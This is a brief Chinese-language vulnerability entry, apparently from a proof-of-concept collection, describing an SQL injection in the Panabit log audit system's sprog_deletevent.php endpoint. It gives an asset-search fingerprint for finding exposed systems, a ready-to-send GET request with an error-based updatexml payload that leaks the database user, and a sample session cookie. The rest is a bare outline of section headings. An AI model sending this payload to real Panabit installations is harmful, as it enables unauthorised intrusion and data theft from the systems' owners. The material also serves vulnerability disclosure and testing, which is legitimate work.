# panabit日志审计系统sprog_deletevent存在SQL注入漏洞

- **系统**：panabit　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="Panabit 日志系统"`
- **请求**：`GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,(select+user())),0)&cloudip=1 HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: PHPSESSID=h5inhsqh9heas1lovb1f5kd355`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
GET /Maintain/sprog_deletevent.php?openid=1&id=1&cloudip=1 HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=h5inhsqh9heas1lovb1f5kd355
Sec-Fetch-User: ?1
```

**其他**
- panabit日志审计系统sprog\_deletevent存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Panabit panalog